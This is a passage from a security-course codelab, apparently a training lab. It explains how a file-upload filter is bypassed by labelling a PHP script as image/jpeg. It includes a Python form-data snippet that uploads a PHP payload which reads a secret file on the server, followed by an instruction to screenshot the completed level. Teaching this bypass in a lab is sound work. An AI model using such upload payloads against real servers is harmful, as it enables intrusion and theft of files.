+<p>Unfortunately, unless the developer actually verifies the content matches its content type, an adversary can still upload a script and have it be executed by lying about the script&#39;s content type. In Python requests, one can specify the Content-Type of the file upload as an additional parameter in the form data. As shown below, the script is labeled as an image/jpeg, allowing for it to be uploaded and subsequently executed. Use it to solve the level.<br></p>
+<pre><code>multipart_form_data = {
+    &#39;csrf&#39; : (None, csrf),
+    &#39;user&#39; : (None, &#39;wiener&#39;),
+    &#39;avatar&#39; : (&#39;secret.php&#39;, &#34;&lt;?php echo file_get_contents(&#39;/home/carlos/secret&#39;); ?&gt;&#34;, &#39;image/jpeg&#39;)
+}</code></pre>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+</google-codelab>
+<script src="https://storage.googleapis.com/claat-public/native-shim.js"></script>
+<script src="https://storage.googleapis.com/claat-public/custom-elements.min.js"></script>
+<script src="https://storage.googleapis.com/claat-public/prettify.js"></script>
+<script src="https://storage.googleapis.com/claat-public/codelab-elements.js"></script>
+<script src="//support.google.com/inapp/api.js"></script>
+</body>
+</html>
